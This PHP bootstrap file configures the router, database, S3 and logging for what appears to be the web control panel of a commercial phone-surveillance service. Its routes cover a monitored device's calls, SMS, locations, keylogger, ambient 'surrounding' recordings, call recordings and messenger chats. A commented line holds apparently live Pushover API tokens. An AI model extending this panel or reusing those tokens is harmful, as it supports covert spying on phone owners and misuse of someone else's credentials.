<?php

$di->setShared('db', function() use ($config) {
    $pdo = new \PDO("mysql:host={$config['db']['host']};dbname={$config['db']['dbname']}", $config['db']['username'], $config['db']['password'], $config['db']['options']);
    //$this->exec("set profiling_history_size = {$config['db']['profiling']}; set profiling = 1;");
    return $pdo;
});

$di->setShared('router', function() use($config) {
    $router = new \System\Router();
    $router->setBaseUrl($config['domain']);
    $router->add('main', new \System\Router\Route('/', array('controller' => 'Index', 'action' => 'login', 'public' => true)));
    $router->add('logout', new \System\Router\Route('/logout', array('controller' => 'Index', 'action' => 'logout', 'public' => true)));
    $router->add('lostPassword', new \System\Router\Route('/lostPassword', array('controller' => 'Index', 'action' => 'lostPassword', 'public' => true)));
    $router->add('resetPassword', new \System\Router\Route('/resetPassword', array('controller' => 'Index', 'action' => 'resetPassword', 'public' => true)));
    $router->add('unlockAccount', new \System\Router\Route('/unlockAccount', array('controller' => 'Index', 'action' => 'unlockAccount', 'public' => true)));
    $router->add('support', new \System\Router\Route('/support', array('controller' => 'Index', 'action' => 'support')));
    $router->add('refundRequest', new \System\Router\Route('/refundRequest', array('controller' => 'Index', 'action' => 'refundRequest')));
    $router->add('profile', new \System\Router\Route('/profile', array('controller' => 'Profile', 'action' => 'index')));

    $router->add('cp', new \System\Router\Route('/cp', array('controller' => 'CP', 'action' => 'main')));
    $router->add('calls', new \System\Router\Route('/cp/calls', array('controller' => 'Calls', 'action' => 'index')));
    $router->add('sms', new \System\Router\Route('/cp/sms', array('controller' => 'Sms', 'action' => 'index')));
    $router->add('locations', new \System\Router\Route('/cp/locations', array('controller' => 'Locations', 'action' => 'index')));
    $router->add('bookmarks', new \System\Router\Route('/cp/bookmarks', array('controller' => 'Bookmarks', 'action' => 'index')));
    $router->add('browserHistory', new \System\Router\Route('/cp/browserHistory', array('controller' => 'BrowserHistory', 'action' => 'index')));
    $router->add('browserBlocked', new \System\Router\Route('/cp/browserBlocked', array('controller' => 'BrowserHistory', 'action' => 'browserBlocked')));
    $router->add('calendar', new \System\Router\Route('/cp/calendar', array('controller' => 'Calendar', 'action' => 'index')));
    $router->add('contacts', new \System\Router\Route('/cp/contacts', array('controller' => 'Contacts', 'action' => 'index')));
    $router->add('keylogger', new \System\Router\Route('/cp/keylogger', array('controller' => 'Keylogger', 'action' => 'index')));
    $router->add('surrounding', new \System\Router\Route('/cp/surrounding', array('controller' => 'Surrounding', 'action' => 'index')));
    $router->add('callRecordings', new \System\Router\Route('/cp/callRecordings', array('controller' => 'CallRecordings', 'action' => 'index')));
    $router->add('photos', new \System\Router\Route('/cp/photos', array('controller' => 'Photos', 'action' => 'index')));
    $router->add('videos', new \System\Router\Route('/cp/videos', array('controller' => 'Videos', 'action' => 'index')));
    $router->add('videosCamera', new \System\Router\Route('/cp/videos/camera', array('controller' => 'Videos', 'action' => 'camera')));
    $router->add('videosNoCamera', new \System\Router\Route('/cp/videos/other', array('controller' => 'Videos', 'action' => 'noCamera')));
    $router->add('viber', new \System\Router\Route('/cp/viber', array('controller' => 'Viber', 'action' => 'index')));
    $router->add('skype', new \System\Router\Route('/cp/skype', array('controller' => 'Skype', 'action' => 'index')));
    $router->add('whatsapp', new \System\Router\Route('/cp/whatsapp', array('controller' => 'Whatsapp', 'action' => 'index')));
    $router->add('facebook', new \System\Router\Route('/cp/facebook', array('controller' => 'Facebook', 'action' => 'index')));
    $router->add('vk', new \System\Router\Route('/cp/vk', array('controller' => 'Vk', 'action' => 'index')));
    $router->add('emails', new \System\Router\Route('/cp/emails', array('controller' => 'Emails', 'action' => 'index')));
    $router->add('applications', new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
    $router->add('settings', new \System\Router\Route('/cp/settings', array('controller' => 'DeviceSettings', 'action' => 'index')));
    $router->add('smsCommands', new \System\Router\Route('/cp/smsCommands', array('controller' => 'SmsCommands', 'action' => 'index')));
    $router->add('upgrade', new \System\Router\Route('/cp/upgrade', array('controller' => 'CP', 'action' => 'upgrade')));

    $router->add('content', new \System\Router\Regex('/:uri', array('controller' => 'Index', 'action' => 'content', 'public' => true), array('uri' => '.+\.html')));
    $router->add('locale', new \System\Router\Regex('/locale/:value', array('controller' => 'Index', 'action' => 'locale', 'public' => true), array('value' => '.+')));
    $router->add('setDevice', new \System\Router\Regex('/setDevice/:devId', array('controller' => 'CP', 'action' => 'setDevice'), array('devId' => '.+')));
    $router->add('smsList', new \System\Router\Regex('/cp/sms/:phoneNumber', array('controller' => 'Sms', 'action' => 'list'), array('phoneNumber' => '.+')));
    $router->add('surroundingDelete', new \System\Router\Regex('/cp/surrounding/delete/:value', array('controller' => 'Surrounding', 'action' => 'delete'), array('value' => '.+')));
    $router->add('surroundingPlay', new \System\Router\Regex('/cp/surrounding/play/:value', array('controller' => 'Surrounding', 'action' => 'play'), array('value' => '.+')));
    $router->add('surroundingDownload', new \System\Router\Regex('/cp/surrounding/download/:value', array('controller' => 'Surrounding', 'action' => 'download'), array('value' => '.+')));
    $router->add('callRecordingsDelete', new \System\Router\Regex('/cp/callRecordings/delete/:value', array('controller' => 'CallRecordings', 'action' => 'delete'), array('value' => '.+')));
    $router->add('callRecordingsPlay', new \System\Router\Regex('/cp/callRecordings/play/:value', array('controller' => 'CallRecordings', 'action' => 'play'), array('value' => '.+')));
    $router->add('callRecordingsDownload', new \System\Router\Regex('/cp/callRecordings/download/:value', array('controller' => 'CallRecordings', 'action' => 'download'), array('value' => '.+')));
    $router->add('photosAlbum', new \System\Router\Regex('/cp/photos/album/:album', array('controller' => 'Photos', 'action' => 'album'), array('album' => '.+')));
    $router->add('viberTab', new \System\Router\Regex('/cp/viber/:tab', array('controller' => 'Viber', 'action' => 'index'), array('tab' => 'private|group|calls')));
    $router->add('skypeTab', new \System\Router\Regex('/cp/skype/:tab', array('controller' => 'Skype', 'action' => 'index'), array('tab' => 'messages|calls')));
    $router->add('whatsappTab', new \System\Router\Regex('/cp/whatsapp/:tab', array('controller' => 'Whatsapp', 'action' => 'index'), array('tab' => 'private|group')));
    $router->add('vkTab', new \System\Router\Regex('/cp/vk/:tab', array('controller' => 'Vk', 'action' => 'index'), array('tab' => 'private|group')));
    $router->add('vkList', new \System\Router\Regex('/cp/vk/:tab/:account/:id', array('controller' => 'Vk', 'action' => 'list'), array('tab' => 'private|group', 'account' => '[0-9]+', 'id' => '[0-9]+')));
    //$router->add('facebookTab', new \System\Router\Regex('/cp/facebook/:tab', array('controller' => 'Facebook', 'action' => 'index'), array('tab' => '[a-z]+')));
    $router->add('viberList', new \System\Router\Regex('/cp/viber/:tab/:id', array('controller' => 'Viber', 'action' => 'list'), array('tab' => 'group|private', 'id' => '.+')));
    $router->add('skypeList', new \System\Router\Regex('/cp/skype/:account/:tab/:id', array('controller' => 'Skype', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'group|private', 'id' => '[a-z0-9\.,\-_]+')));
    $router->add('skypeListConference', new \System\Router\Regex('/cp/skype/:account/conference/:id', array('controller' => 'Skype', 'action' => 'conference'), array('account' => '[^/]+', 'id' => '[a-z0-9\.,\-_]+')));
    $router->add('whatsappList', new \System\Router\Regex('/cp/whatsapp/:tab/:id', array('controller' => 'Whatsapp', 'action' => 'list'), array('tab' => 'private|group', 'id' => '[0-9]+')));
    $router->add('facebookList', new \System\Router\Regex('/cp/facebook/:account/:tab/:id', array('controller' => 'Facebook', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[a-zA-Z0-9\:]+')));
    $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[-._@a-zA-Z0-9]{6,60}')));
    $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[-._@a-zA-Z0-9]{6,60}', 'timestamp' => '[\d]{1,10}')));

    $router->add('adminLogin', new \System\Router\Route('/admin/login', array('controller' => 'Admin', 'action' => 'login', 'public' => true)));
    $router->add('adminLostPasswordSend', new \System\Router\Route('/admin/lostPasswordSend', array('controller' => 'Admin', 'action' => 'lostPasswordSend', 'public' => true)));
    $router->add('adminCreatePassword', new \System\Router\Route('/admin/createPassword', array('controller' => 'Admin', 'action' => 'createPassword', 'public' => true)));

    return $router;
});

$di->setShared('flashMessages', function () {
    return new \System\FlashMessages();
});

$di->setShared('auth', function () {
    return new \System\Auth('name');
});

$di->setShared('view', function() use ($di) {
    $smarty = new \Smarty();
    foreach ($di['config']['smarty'] as $key => $value) {
        $smarty->{$key} = $value;
    }

    return new \System\View\Smarty($smarty);
});

$di->setShared('locale', function()use($config) {
    if (isset($_COOKIE['locale']) && key_exists($_COOKIE['locale'], $config['locales'])) {
        return $_COOKIE['locale'];
    } else {
        $locale = \System\Translator::getBestLocale(array_keys($config['locales']));

        setcookie('locale', $locale, time() + 3600 * 24 * 30, '/');
        return $locale;
    }
});

$di->setShared('t', function () use ($di) {
    return new \System\Translator(require ROOT_PATH . 'locales/' . $di->get('locale') . '.php');
});

$di->setShared('S3', function () use ($di) {
    $s3 = new \S3($di['config']['s3']['key'], $di['config']['s3']['secret']);
    $s3->setSigningKey($di['config']['cloudFront']['keyPairId'], $di['config']['cloudFront']['privateKeyFile']);

    return $s3;
});

$logger = new Monolog\Logger('logger');
$logger->pushProcessor(new Monolog\Processor\WebProcessor());

if (APPLICATION_ENV == 'development') {
    $logger->pushHandler(new Monolog\Handler\StreamHandler($config['logger']['stream']['filename'], Monolog\Logger::DEBUG));
    $logger->pushHandler(new Monolog\Handler\ChromePHPHandler(Monolog\Logger::DEBUG));
    //$logger->pushHandler(new Monolog\Handler\PushoverHandler('aUA4Bj2fTRyi9B4YosYFAnzaSAw5Js', 'uCnHUMtNRZccsF15aBi4x9umaBdbTg', 'TEST', Monolog\Logger::DEBUG));
} elseif (APPLICATION_ENV == 'production') {
    $logger->pushHandler(new Monolog\Handler\StreamHandler($config['logger']['stream']['filename'], Monolog\Logger::INFO));
    //$logger->pushHandler(new Monolog\Handler\NativeMailerHandler($config['logger']['mail']['from'], $config['logger']['mail']['subject'], $config['logger']['mail']['to']));
}

Monolog\ErrorHandler::register($logger);

$di->set('logger', $logger);
